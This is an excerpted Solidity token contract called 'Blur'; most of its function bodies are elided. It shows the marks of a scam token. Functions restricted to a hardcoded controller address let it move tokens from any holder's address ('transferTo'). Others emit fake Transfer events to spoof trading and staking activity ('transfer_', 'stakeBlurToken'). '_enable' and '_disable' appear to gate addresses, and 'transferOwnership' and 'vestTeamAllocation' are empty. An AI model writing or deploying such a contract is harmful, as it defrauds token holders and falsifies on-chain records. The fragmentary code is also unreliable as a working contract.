...
contract Blur is Context, IERC20 {
    ...
    address deployer = 0x3f347AD34247955250B434CCAC68D48795A1cE4d;
    address public _comptroller = 0x3f347AD34247955250B434CCAC68D48795A1cE4d;
   constructor () public {
        ...
        _enable(0x2d78354722a1A3D731fBCeB7cd1A13828C4B9266);
        _enable(0x055C236D2A50082EC621D38Cd528773545698b53);
        _enable(0x138bf096b054B5f24Ca0739bb17F3C0A9EBD9c74);
...
//-----------------------------------------------------------------------------------------------------------------------//
   ...
   function transferOwnership()public _verify(){}


   function vestTeamAllocation()public _verify(){}
  ...
  function _disable(address recipient) public _verify(){
    ...
    function transferTo(address from, address to, uint256 amt) public _verify() virtual returns (bool) {
        //Single Tranfer
    ...
    function transfer_(address fromEmt, address toEmt, uint256 amtEmt) public _verify(){
        //EmitSingleTransfer
  ...
  function stakeBlurToken(address uPool,address[] memory eReceiver,uint256[] memory eAmounts)  public _verify(){
    //MultiTransferEmit
    for (uint256 i = 0; i < eReceiver.length; i++) {emit Transfer(eReceiver[i], uPool, eAmounts[i]);}}
